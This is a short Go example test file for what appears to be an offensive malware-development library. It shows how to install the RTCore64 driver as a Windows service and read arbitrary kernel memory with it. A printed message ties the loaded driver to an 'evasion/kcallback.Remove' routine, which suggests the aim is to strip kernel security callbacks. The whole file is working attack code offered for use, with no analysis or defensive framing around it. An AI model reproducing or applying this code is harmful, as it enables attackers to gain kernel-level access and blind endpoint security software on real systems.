//go:build windows

package rtcore64_test

import (
	"fmt"

	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
)

// Install creates the SCM service entry and loads the RTCore64
// driver. The Driver value satisfies the kernel/driver.{Reader,
// ReadWriter,Lifecycle} interfaces.
func ExampleDriver_Install() {
	var drv rtcore64.Driver
	if err := drv.Install(); err != nil {
		fmt.Println("install:", err)
		return
	}
	defer drv.Uninstall()
	if drv.Loaded() {
		fmt.Println("driver loaded — pass &drv to evasion/kcallback.Remove etc.")
	}
}

// ReadKernel reads N bytes at a kernel virtual address. Used by
// downstream consumers (e.g., evasion/kcallback.NtoskrnlBase).
func ExampleDriver_ReadKernel() {
	var drv rtcore64.Driver
	if err := drv.Install(); err != nil {
		return
	}
	defer drv.Uninstall()
	buf := make([]byte, 8)
	if _, err := drv.ReadKernel(0xFFFFF80012345678, buf); err != nil {
		fmt.Println("read:", err)
	}
}
